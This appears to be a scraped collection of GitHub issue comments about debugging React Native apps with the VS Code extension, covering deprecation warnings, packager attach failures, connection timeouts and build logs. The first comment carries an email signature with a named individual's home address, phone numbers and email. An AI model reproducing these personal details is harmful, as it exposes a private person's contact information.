    "hjpsievert": "Hello Vladimir:\nThanks for the update and detail. So does that mean that the newest version of react-native tools on Visual Studio Code is just fine and these are erroneous deprecation warnings that I can ignore or is there a future change that will make them go away.\nI have also been seeing error messages about promises and timeouts after setting breakpoints that started a few days ago when I updated react-native tools, but breakpoints work just fine. Is that something I should report the next time I see them or is that another known \u2018fake\u2019 problem?\nBest regards,\nHans-J\u00fcrgen (HJ) Sievert\n:: 3770 Vancouver Drive, Reno, NV 89511\n:: Cell (775) 742-7425 Home (775) 853-4599\n::  hj.sievert@gmail.com hj.sievert@gmail.com\n:: http://www.linkedin.com/in/hjsievert\nFrom: Vladimir Kotikov [mailto:notifications@github.com] \nSent: Wednesday, February 15, 2017 7:04 AM\nTo: Microsoft/vscode-react-native vscode-react-native@noreply.github.com\nCc: hjpsievert hj.sievert@gmail.com; Mention mention@noreply.github.com\nSubject: Re: [Microsoft/vscode-react-native] Deprecation warning from Node (#398)\nHey @hjpsievert https://github.com/hjpsievert , thanks for reporting!\nUnfortunately I don't think we can avoid this. As I noted in #394 https://github.com/Microsoft/vscode-react-native/pull/394 :\nI'm still seeing Node's GLOBAL deprecation message, but I doubt we could avoid it because GLOBAL's setter is also configured to emit this warning (see https://github.com/nodejs/node/blob/master/lib/internal/bootstrap_node.js#L203-L219)\nSo this warning will be emitted at least once, when we try to write GLOBAL property\nAs for the change you suggested, I don't think it would help since you are basically proposing to define module local variable named GLOBAL, however the intent was to overwrite 'global' GLOBAL. Moreover in this case, since deprecation warning is not triggered early before react native code is loaded, it will be triggered after then by react - in my case it leads to the red box shown on the screen.\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub https://github.com/Microsoft/vscode-react-native/issues/398#issuecomment-280034740 , or mute the thread https://github.com/notifications/unsubscribe-auth/AVVt_hcrlYt14KTKHn-guAJCWKGbFBf1ks5rcxPzgaJpZM4MBZOG .  https://github.com/notifications/beacon/AVVt_pPI6OMQ_LrbNNfFYftBdrGrHGwWks5rcxPzgaJpZM4MBZOG.gif \n. ",
    "jhalborg": "Hey :) \nI'm getting this error, and it's crashing my app when continuing from the last breakpoint. \nUsing vscode 1.15.1\nvscode-react-native: 0.4.1\nExpo: 20.0\nAny way to suppress the warning?. I have a similar issue. After using remotedev.io as my redux inspector for a while, I got tired of it's inconsistancies, and have now switched to React Native Debugger. I'm running my app (Expo) on localhost:19001, and the React Native Debugger connects just fine. I miss being able to set breakpoints in VSCode though, so I thought I'd try attaching VSCode to the process for breakpoints and inspections. \nI configured the standard launch.json Attatch to debugger profile  from\n{\n      \"name\": \"Attach to packager\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"attach\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n    },\nto\n{\n      \"name\": \"Attach to packager\",\n      \"program\": \"${workspaceRoot}/.vscode/launchReactNative.js\",\n      \"type\": \"reactnative\",\n      \"request\": \"attach\",\n      \"sourceMaps\": true,\n      \"outDir\": \"${workspaceRoot}/.vscode/.react\",\n      \"port\": \"19001\"\n    },\nbut I get the error mentioned in this issue, \nCould not debug. Cannot attach to packager. Are you sure there is a packager and it is running in the port 8081? If your packager is configured to run in another port make sure to add that to the setting.json.\nWhat should I do to attach VSCode to the process?. Thanks for the quick response, that's awesome! :D\nUntil now, I've run the packager from the extension which has worked great. The reason I'm running into this problem is that I want to monitor my redux store, and have grown tired of the remote-redux-tools approach, as it only works some of the time. Therefore I've tried switchin to the full React Native Debugger, which works great - except that using that approach, I've lost the ability to inspect and breakpoint from VSC. \nThe quickfix seems to work in that it respects the port - nice! :-) I now run into the problem that the React Native Debugger seems to occupy the debug port, so VSC won't attach: \nEstablished a connection with the Proxy (Packager) to the React Native application\nDisconnected from the Proxy (Packager) to the React Native application. Retrying reconnection soon...\nCould not debug. Another debugger is already connected to packager. Please close it before trying to debug with VSCode.\nThis is not a bug, but a problem. I'm not sure how I can have a redux monitoring window open at the same time as using the RN extension to debug - is that even possible, without using a proxy such as remotedev.io?. Yes, that's correct - so it is indeed impossible. I have to keep using remotedev.io (https://github.com/zalmoxisus/remote-redux-devtools) which the extension you link to wraps into a VSCode extension. \nThanks for the help anyways :-) At least we discovered the port bug :-). I'm getting this issue with 0.6.10 @ruslan-bikkinin \nOS: darwin x64\nAdapter node: v7.9.0 x64\nvscode-chrome-debug-core: 3.17.3\n{ Error: connect ENOENT /tmp/vscode-reactnative-3ac6a0299f88064cac596ab8d8463ced9844a1d6805afefc4da3790e722144e7.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '/tmp/vscode-reactnative-3ac6a0299f88064cac596ab8d8463ced9844a1d6805afefc4da3790e722144e7.sock' }{ Error: connect ENOENT /tmp/vscode-reactnative-3ac6a0299f88064cac596ab8d8463ced9844a1d6805afefc4da3790e722144e7.sock\n    at Object.exports._errnoException (util.js:1050:11)\n    at exports._exceptionWithHostPort (util.js:1073:20)\n    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1097:14)\n  code: 'ENOENT',\n  errno: 'ENOENT',\n  syscall: 'connect',\n  address: '/tmp/vscode-reactnative-3ac6a0299f88064cac596ab8d8463ced9844a1d6805afefc4da3790e722144e7.sock' }. ",
    "galvesribeiro": "@vladimir-kotikov  thanks for the prompt reply.\nI just cloned, npm install and F5 on VSCode... same problem \n[Error] \"Could not debug. Unable to set up communication with VSCode react-native extension. Is this a react-native project, and have you made sure that the react-native npm package is installed at the root?\" \ud83d\ude1e \n. @vladimir-kotikov \nGUTO-MAC-MINI:reactnativets guto$ react-native -v\nreact-native-cli: 2.0.1\nreact-native: 0.41.2 . @vladimir-kotikov ok, after close and open VSCode multiple times I was able to run and attach the debugger. \nHowever, I noticed that it is kind of unstable. Sometimes we see the red screen on the simulator. Then we click somewhere and it get back. I'll try to simulate the problem and report back.\nThere is also a warning throwing all the time: (node:86146) DeprecationWarning: 'GLOBAL' is deprecated, use 'global'\nAlso, I've enabled the Hot/LiveReload in the dev menu but it doesn't work. In fact, if I reload the page the changes aren't caught. Looks like the TS isn't being compiled... Any ideas? . @vladimir-kotikov I tried to change the \"build\": \"tsc\" to \"build\": \"tsc --watch\" no lucky... It hangs on the build phase.\nSince the watch task never return, it hangs and the process don't move forward:\n```\n\nreact-native-ts@0.0.3 prebuild /Users/guto/dev/samples/reactnativets\nrm -rf build\nreact-native-ts@0.0.3 build /Users/guto/dev/samples/reactnativets\ntsc --watch\n9:00:27 AM - Compilation complete. Watching for file changes.\n`` \n. even if I runtsc --watchin an external terminal it still doesn't work.... It isn't happening here @vladimir-kotikov... I removed the repo, re-cloned,npm i` and run from vscode.\n\n\nThe spinner appear as you mentioned\nThe Android simulator show Hot reloading... in a Toast\nThe log show:\nBundling `index.android.js`\n  No module changed.\nNothing change on the application\n\nIf I ask for reload (r twice) then I have the changes applied...\nWhat is wrong? :(. Also, the debugger isn't able to evaluate vaiables:\n\nLook at the values in the debugger console:\nthis.state.counter is undefined\ncounter is 1 where counter is nothing more than this.state.counter + 1 so it is defined.. @MSLaguana this is what being generated:\n_this.onPress=function(){\nvar counter=_this.state.counter+1;\nif(counter<_this.props.max){\nreturn _this.setState({counter:counter});\n}\nYes, it is accessible thru _this and appear on Closure. However, I though it is the purpose of souceMaps to handle those maps...\nAnyway, understood the case, but I still can't see why the live/hot reload doesn't work... . @vladimir-kotikov You are right... It works if I change something on render. \n\nI believe this is due to template implementation, specifically because onPress is defined as a class' field rather than prototype's property.\n\nI don't know what you mean... The javascript react-native init-based project, just work... The problem here is between TS and the extension :(. Yeah, it worked... I just think it is weird... I have another ReactJS (no react-native) applications using typescript and the methods are declared with lambdas just like that and it work pretty fine with regular debugger on VSCode.... ",
    "EamonnLaffey": "I am using Haul and ts-loader to try and get debugging with this extension working. The .bundle and .bundle.map files seem to be generated fine and put into the .vscode/.react folder. However, when I attach to packager, breakpoints are labelled as unverified due to a possible source map error and the app will stay on a white screen. I can see and step through the tsx files in the chrome debugger however I cannot do the same in vscode.  . @vladimir-kotikov Sure I have created the issue here: https://github.com/Microsoft/vscode-react-native/issues/469\nAnd put up a sample project here: https://github.com/EamonnLaffey/tshaulreactnative\nThanks!. ",
    "ferologics": "@vladimir-kotikov I see, the iosRelativeProjextPath would've is what I was looking for. I moved the whole project inside so it's no longer needed. Still not able to compile though:\nThe following build commands failed:\n    Ld build/Build/Intermediates/App.build/Release-iphoneos/App.build/Objects-normal/armv7/App normal armv7\n    Ld build/Build/Intermediates/App.build/Release-iphoneos/App.build/Objects-normal/arm64/App normal arm64\n(2 failures)\n[Error] \"Could not debug. Error while executing command 'xcodebuild -project /Users/master/Projects/App/ios/App.xcodeproj -scheme App -destination generic/platform=iOS -derivedDataPath /Users/master/Projects/App/ios/build': Error while executing command 'xcodebuild -project /Users/master/Projects/App/ios/App.xcodeproj -scheme App -destination generic/platform=iOS -derivedDataPath /Users/master/Projects/App/ios/build'\"\nThe compilation error is on my end. Weirdly, the command vscode is running fails to build the project but Xcode itfelf has no problem.. ",
    "mongris": "I think it's a bug.\nI can access __debug__ after change \nhttps://github.com/Microsoft/vscode-react-native/blob/master/src/debugger/appWorker.ts#L45\nto \njavascript\nglobal.__debug__ = {require: require};. Thank you, I have changed locally and waiting form next release with #401.. @ajonno __debug__.require has exported in vscode-react-native, and it's an issue owned by realm-js now.\nrealm-js should release the fix for getContext included in https://github.com/realm/realm-js/commit/f6347cf59fd71f90723f38f63152418ab642f348. @Arman92 what's version of your realm and vscode-react-native? And what's the error stack?\nAnd you should replace the code every time when you upgrade npm packages.\nI copied a getContext code in my project and replace manually after running any yarn or npm command. It's annoying but it should be working.. ",
    "ajonno": "when will this fix be released ? i currently can't debug in VS Code am seeing this error: Unknown named module: './submit-analytics' . i can't set breakpoints either and would dearly love to for obvious reasons. come on Microsoft help us all out ! :-). ",
    "Arman92": "I still have this issue! \nTried @mongris  solution (changed the lines of lib/index.js), did not work.\nAnyone got a working fix?. ",
    "nicolaselmir": "I had the same problem. how to fix this. ",
    "divyad": "I am also facing the same issue. Hope to get an update soon :). ",
    "kibagateaux": "As of April 27th I am still having this issue with the exact same error message\nReact-Native VS Code extension version: 0.3.2\nVSCode version: 1.11.2\nOS platform and version: macOS Sierra 10.12.4\nNodeJS version: 7.8\nReact Native version: 0.43.4\n. ",
    "Sofiane-13": "@vladimir-kotikov   @cem2ran  @divyad @nicolaselmir @kibagateaux \nPlease, you have found the solution?\n\n. http://stackoverflow.com/questions/43967521/unable-to-resolve-module-fonts-entypo-ttf-from-home-pfe-node-modules-expo. ",
    "Gumija": "@vladimir-kotikov thank you for the fast reaction time.\nI didn't have \"Debug JS Remotely\" enabled. It used to work like this:\n\nStart packager\nAttach to packager\nPress Debug JS Remotely\n\nOtherwise it would start the debugger in chrome. Now I get stuck at the 2nd step. Now I tried with \"Debug JS Remotely\" first, but didn't help.\nI don't use xdl maybe one of my  dependencies? I found out in the meantime that the xdl error was because I use a private npm registry and there are some finicky stuff with that and npm scopes. I got that fixed. Xdl errors no longer appear. \nNow I have a new error sometimes after waiting a lot in dev tools console:\nEnsure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the target: connect ECONNREFUSED 127.0.0.1:28321).\n. @vladimir-kotikov  so what happens is:\n1. Press \"Start Debugging\" with Debug Android config\n2. Console output (as below), build is fine, packager starts fine as well.\n3. Application started on the device in debug mode, but stuck at a white screen.\n4. Ensure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the target: connect ECONNREFUSED 127.0.0.1:31486).\n5. Progress indicator stops with this error and the debugger panel disappears\nWhat I noticed in the mean time that I don't have a launchReactNative.js file. Even when I delete the .vscode folder and reopen the project folder.\nOutput/React-Native window:\n```\nGetting exponent dependecy.\n### Checking react native is correctly setup. This may take a while...\nChecking if the correct react native is installed..\n### Starting Packager\n### Executing command: react-native.cmd start --port 8081\nScanning 627 folders for symlinks in c:\\SourceControl\\ap-react-native\\node_modules (24ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   c:\\SourceControl\\ap-react-native \nReact packager ready.\n### Packager started.\nLoading dependency graph, done.\nBundling index.android.js\n  Transforming modules  100.0% (639/639), done.\n### The Bundle Cache was prewarmed.\n### Attaching to running React Native packager\n### Checking react native is correctly setup. This may take a while...\nChecking if the correct react native is installed..\n### Packager is already running.\nBundling index.android.js\n  No module changed.\n### The Bundle Cache was prewarmed.\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\SourceControl\\ap-react-native\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\SourceControl\\ap-react-native\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\SourceControl\\ap-react-native\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"c:\\SourceControl\\ap-react-native\"\n```\nDebug Console:\n```\n[vscode-react-native] Starting React Native Packager.\n[vscode-react-native] Prewarming bundle cache. This may take a while ...\n[vscode-react-native] Building and running application.\n[vscode-react-native] Executing command: react-native.cmd run-android\nJS server already running.\nBuilding and installing the app on the device (cd android && gradlew.bat installDebug...\nIncremental java compilation is an incubating feature.\n:app:preBuild\nUP-TO-DATE\n------------------ HERE MORE UP-TO-DATE --------------\nUP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Nexus 5X - 7.1.1' for app:debug\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 20.283 secs\nRunning C:\\Users\\Milan\\AppData\\Local\\Android\\sdk/platform-tools/adb -s 0110815f568f2ee6 reverse tcp:8081 tcp:8081\nStarting the app on 0110815f568f2ee6 (C:\\Users\\Milan\\AppData\\Local\\Android\\sdk/platform-tools/adb -s 0110815f568f2ee6 shell am start -n com.safeass/.MainActivity)...\nStarting: Intent { cmp=com.safeass/.MainActivity }\n[vscode-react-native] Finished executing: react-native.cmd run-android\n[vscode-react-native] Executing command: adb -s \"0110815f568f2ee6\" reverse tcp:8081 tcp:8081\n[vscode-react-native] \n[vscode-react-native] Finished executing: adb -s \"0110815f568f2ee6\" reverse tcp:8081 tcp:8081\n[vscode-react-native] Executing command: adb -s 0110815f568f2ee6 shell am broadcast -a \"com.safeass.RELOAD_APP_ACTION\" --ez jsproxy true\n[vscode-react-native] Broadcasting: Intent { act=com.safeass.RELOAD_APP_ACTION (has extras) }\nBroadcast completed: result=0\n[vscode-react-native] Finished executing: adb -s 0110815f568f2ee6 shell am broadcast -a \"com.safeass.RELOAD_APP_ACTION\" --ez jsproxy true\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Debugger worker loaded runtime on port 31486\nDev Tools Console:\n/C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/electron-browser/workbench.main.js:31 Overwriting extension <<.jsx>> to now point to mime <>\n/C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/electron-browser/workbench.main.js:71 Ctrl+Alt+ keybindings should not be used by default under Windows. Offender:  2611  for  java.projectConfiguration.update\n/C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/electron-browser/workbench.main.js:136 [Extension Host] typescript (vscode.typescript) uses PROPOSED API which is subject to change and removal without notice\n/C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/electron-browser/workbench.main.js:136 [Extension Host] Windows_NT\n/C:/Program Files (x86)/Microsoft VS Code/resources/app/out/vs/workbench/electron-browser/workbench.main.js:136 [Extension Host] vscode-icons is active!\nmessageService.ts:126 Ensure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the target: connect ECONNREFUSED 127.0.0.1:31486).\n```. @vladimir-kotikov Updating NodeJS to v6.10.0 helped. Thanks for the tip.. ",
    "neomib": "Saved my day!!!! Thanks!. ",
    "bochen2014": "I don't have that \"Attach to packager\" option available to me. \nI'm running latest versions of VSCode (ver 1.16.1) and vscode-ract-native(ver 0.4.2)\nwhen I click the gear icon within debug view, I wasn't pompted a \"choose debug env\" drop down, but rather, the launch.json file opened in editor directly.\nnot sure how you guys have that 'Attach to packager' configured. . here is how I got my \"Debug Android\" configuration from:\n\nwhere I can find \"attach to packager\" configuration?. thanks @iTOYS  for your reply. \nI think there definitely some tricks here. \nif you can't get the select Environment drop down pop us like I mentioned above\nyou need to make sure\n1. delete .vscode/launch.json\n2. close all editors. \ndisable remote debugging will solve the issue.\nIt seems to me that, I can't use Chrome debug and Run Android on Simulator together. Am I correct?. right....\nI think I figured out what happened before. \npreviously, I ran Debug Android first, and once my app was loaded into simulator, I clicked  'Debug JS Remotely' ; note that after this, the application will connect to vscode debugger port (can be configured via internalDebuggerPort in launch.json; otherwise vscode will randomly allocate one) for remote debugging;\nAfter this, I was exploring Run Android on Simulators on the same simluator, note that at this time\n1. vscode debug port is not opened as we not running a debug session\n2. due to cache issue, the application\n    a. has 'remote debugging' on\n    b. has remote debugger points to vscode internal debugger port\ntherefore, the application hangs.  does anybody know how to clear the cache?\nto fix the issue, after run Run Android on Simluators we need to do the following:\n1. disable remote debugging\n2. reload\n3. enable remote deubgging again\nthis is force application to connect to Chrome debugger (#8081)\nHope it will help somebody (as I was really confused before). hi @iTOYS , yes that's what I was talking about. \nI have seen different output by running react-native start via windows cmd (on windows 7) and vscode-react-tools. but you are right, we just spawn a process to run the same command and redirect the output to vscode command output -- nothing we can do about it.\ninterestingly, when I do the same on my windows 10 box, I got different behavior again\n\nand I have to use git-bash to run it which would work as expected. \nWeird stuff, isn't it?!\n. ",
    "johngoren": "I had trouble attaching to packager until I reinstalled the React Tools extension. Before that, I kept getting \"Starting custom debugger by executing: echo A debugger is not needed.\". ",
    "prorigorous": "I have the encountered the same problem. At first upgraded node did not solve, and restarted the computer actually solved\uff01. ",
    "jpokrzyk": "Ah nice. Yea that makes sense.\nI still think the packager should top when the user hits the stop button on the debugger (and then maybe don't stop the packer when the user hits the debugger restart button).\nBut now that I know the command to stop the packager, that's all I really wanted. Thanks for working on this, debugging RN in VS Code is a great experience!\n. ",
    "ilhamahp": "@jpokrzyk  I feel the same way ,,, it is so annoying when  you stop it but the packager still running in background. I have to kill it on by one ,since there are so many of them ,,, sigh. @vladimir-kotikov  In my case , I made several projects continuously. The purpose is  testing the effect from  different package's versions  for my task.  I used to use RN in windows. Everytime I runreact-native run-android or react-native start, it will pop up a new window foe Node,js for processing the packager. It works the same way in mac. Then, linux behave differently. instead pop up a new windows, it runs in background. So when I make another project, I have to kill node process. ",
    "MrMYHuang": "The issue is solved. The issue is that I didn't turn on JS Remote Debugging in the UWP app. The solution:\n1. In the UWP app, open the developer menu by Shift+F10.\n2. Select \"Start JS Remote Debugging.\". ",
    "pvinis": "yea i thought of that. i have react-native-cli installed globally, and react-native in the package.json in the folder. if i do react-native -v in the terminal of vscode, i get teh versions nicely.. ```\n\nwhich react-native\n/usr/local/Cellar/node/7.7.1/bin/react-native\n``\nand thats whatyarn global bin` returns, so thats the correct path i guess.\n\n```\n\nprocess.env.PATH\n\"/Users/pvinis/.fastlane/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/Cellar/node/7.6.0/bin\"\n``\nhm thats different. how can i refresh it or make sure its always up to date?. hm, yes. and i had the old terminal still open, so the path on that one has still the old. and i opened code bycode .so that caused it. isourced my.zshrc` and launched code again, and it was generated. thank you :). \n",
    "rendomnet": "Wow my problem with react-native-tools not working for months was fixed by this.\nWhat is difference when you launch vscode with \"icon click\" and with \"code .\" command?. @vladimir-kotikov so how can I make it read my zsh nvm stuff correctly without launching it from terminal?. ",
    "JonnyLinja": "I created a brand new RN project and added those two lines to my Debug Android configuration. Again, it launches on the device but the bar is blue and not orange, so the breakpoints aren't operating.\nSpecs:\n- React-Native VS Code extension version: 0.3.1\n- VSCode version: 1.10.2\n- OS platform and version: Mac OS Sierra 10.12.1\n- NodeJS version: 6.9.1\n- React Native version: 0.39.2 (I can't move to 0.40+ yet)\n```\n[vscode-react-native] Starting React Native Packager.\n[vscode-react-native] Prewarming bundle cache. This may take a while ...\n[vscode-react-native] Building and running application.\n[vscode-react-native] Executing command: react-native run-android\nJS server already running.\nRunning adb -s 006d595750d741ef reverse tcp:8081 tcp:8081\nBuilding and installing the app on the device (cd android && ./gradlew installDebug)...\n:app:preBuild\nUP-TO-DATE\n:app:preDebugBuild\nUP-TO-DATE\n:app:checkDebugManifest\n:app:preReleaseBuild\n UP-TO-DATE\n:app:prepareComAndroidSupportAppcompatV72301Library\nUP-TO-DATE\n:app:prepareComAndroidSupportRecyclerviewV72301Library\nUP-TO-DATE\n:app:prepareComAndroidSupportSupportV42321Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoDrawee0110Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoFbcore0110Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoFresco0110Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoImagepipeline0110Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineBase0110Library\nUP-TO-DATE\n:app:prepareComFacebookFrescoImagepipelineOkhttp30110Library\nUP-TO-DATE\n:app:prepareComFacebookReactReactNative0392Library\nUP-TO-DATE\n:app:prepareComFacebookSoloaderSoloader010Library\nUP-TO-DATE\n:app:prepareOrgWebkitAndroidJscR174650Library\nUP-TO-DATE\n:app:prepareDebugDependencies\n:app:compileDebugAidl\nUP-TO-DATE\n:app:compileDebugRenderscript\nUP-TO-DATE\n:app:generateDebugBuildConfig\nUP-TO-DATE\n:app:generateDebugAssets\nUP-TO-DATE\n:app:mergeDebugAssets\nUP-TO-DATE\n:app:generateDebugResValues\nUP-TO-DATE\n:app:generateDebugResources\nUP-TO-DATE\n:app:mergeDebugResources\nUP-TO-DATE\n:app:bundleDebugJsAndAssets\nSKIPPED\n:app:processDebugManifest\nUP-TO-DATE\n:app:processDebugResources\nUP-TO-DATE\n:app:generateDebugSources\n UP-TO-DATE\n:app:processDebugJavaRes\nUP-TO-DATE\n:app:compileDebugJavaWithJavac\nUP-TO-DATE\n:app:compileDebugNdk\nUP-TO-DATE\n:app:compileDebugSources\nUP-TO-DATE\n:app:preDexDebug\n UP-TO-DATE\n:app:dexDebug\nUP-TO-DATE\n:app:validateDebugSigning\n:app:packageDebug\nUP-TO-DATE\n:app:zipalignDebug\nUP-TO-DATE\n:app:assembleDebug\nUP-TO-DATE\n:app:installDebug\nInstalling APK 'app-debug.apk' on 'Nexus 4 - 5.1.1'\nInstalled on 1 device.\nBUILD SUCCESSFUL\nTotal time: 31.974 secs\nThis build could be faster, please consider using the Gradle Daemon: http://gradle.org/docs/2.4/userguide/gradle_daemon.html\nStarting the app on 006d595750d741ef (adb -s 006d595750d741ef shell am start -n com.mynewapp/.MainActivity)...\nStarting: Intent { cmp=com.mynewapp/.MainActivity }\n[vscode-react-native] Finished executing: react-native run-android\n[vscode-react-native] Executing command: adb -s \"006d595750d741ef\" reverse tcp:8081 tcp:8081\n[vscode-react-native] \n[vscode-react-native] Finished executing: adb -s \"006d595750d741ef\" reverse tcp:8081 tcp:8081\n[vscode-react-native] Executing command: adb -s 006d595750d741ef shell am broadcast -a \"com.mynewapp.RELOAD_APP_ACTION\" --ez jsproxy true\n[vscode-react-native] Broadcasting: Intent { act=com.mynewapp.RELOAD_APP_ACTION (has extras) }\nBroadcast completed: result=0\n[vscode-react-native] Finished executing: adb -s 006d595750d741ef shell am broadcast -a \"com.mynewapp.RELOAD_APP_ACTION\" --ez jsproxy true\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n```. @vladimir-kotikov Apologies, I missed your previous message.\nThe app does start successfully when launched from VSCode.\nI do not see debuggerWorker.js\nI realized that I didn't enable developer mode on the phone, so I did that and tried again to no avail. USB debugging is enabled as well. Is there something else I need to do to enable JS debugging?. You are indeed correct sir! I never did turn it on. Turning it on however led to a blank white screen.\n\nRefreshing it CMD+R then led to this error\n\nThe Debug console became\n** BUILD SUCCEEDED **\nInstalling build/Build/Products/Debug-iphonesimulator/CookieApp.app\nLaunching org.reactjs.native.example.CookieApp\norg.reactjs.native.example.CookieApp: 8349\n[vscode-react-native] Finished executing: react-native run-ios --simulator iPhone 5s --project-path ios\n[vscode-react-native] Starting debugger app worker.\n[vscode-react-native] Established a connection with the Proxy (Packager) to the React Native application\n[vscode-react-native] Debugger worker loaded runtime on port 27368\nAnd the Output console shows\n```Getting exponent dependecy.\n### Checking react native is correctly setup. This may take a while...\nChecking if the correct react native is installed..\n### Starting Packager\n### Executing command: react-native start --port 8081\nScanning 556 folders for symlinks in /Users/Administrator/Documents/TestNewRNApp/CookieApp/node_modules (9ms)\n \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \n \u2502  Running packager on port 8081.                                            \u2502 \n \u2502                                                                            \u2502 \n \u2502  Keep this packager running while developing on any JS projects. Feel      \u2502 \n \u2502  free to close this tab and run your own packager instance if you          \u2502 \n \u2502  prefer.                                                                   \u2502 \n \u2502                                                                            \u2502 \n \u2502  https://github.com/facebook/react-native                                  \u2502 \n \u2502                                                                            \u2502 \n \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \nLooking for JS files in\n   /Users/Administrator/Documents/TestNewRNApp/CookieApp \nReact packager ready.\nLoading dependency graph, done.\n### Packager started.\nBundling index.ios.js  100.0% (301/301), done.\n### The Bundle Cache was prewarmed.\nBundling index.ios.js  100.0% (301/301), done.\nBundling index.ios.js  100.0% (455/455), done.\nStarting custom debugger by executing: echo A debugger is not needed:  \"/Users/Administrator/Documents/TestNewRNApp/CookieApp\"\nStarting custom debugger by executing: echo A debugger is not needed:  \"/Users/Administrator/Documents/TestNewRNApp/CookieApp\"\n```\nReading a bit more about the debugger...am I supposed to set REACT_DEBUGGER somewhere?\nAlso, as this seems to be more troubleshooting, is there a better place to ask these questions, say, a Slack channel or something equivalent? Thanks for the help!. I've mostly been trying this with standalone blank new project. It's probably a separate issue, but I'm running into different problems when trying to debug remotely on my actual project.\nWhen I try debugging remotely with my actual project, I get the error: Ensure Node was launched with --inspect. Cannot connect to runtime process, timeout after 10000 ms - (reason: Cannot connect to the target: connect ECONNREFUSED 127.0.0.1:9538).\nIf I start up the default Chrome debugger and try again, I'll get (http://localhost:8081/debugger-ui) I'll get  [Error] \"Could not debug. Another debugger is already connected to packager. Please close it before trying to debug with VSCode.\"\nI wonder if it's by any chance Reactotron?. Gotcha, I'll wait for the next release and try again.\nAs for the node error, I get it every time so I'll make a new issue now.. @vladimir-kotikov I still have this issue on 0.4.0 via the iOS Simulator (I haven't tested on anything else yet). I'm also up to date on VSCode.\nEssentially, I run the app from VSCode, all is well. I then start remote debugging. It restarts the app, and then I get the error.\nSo long as the app is in Debug mode (aka I don't uninstall), any runs from VSCode will result in that 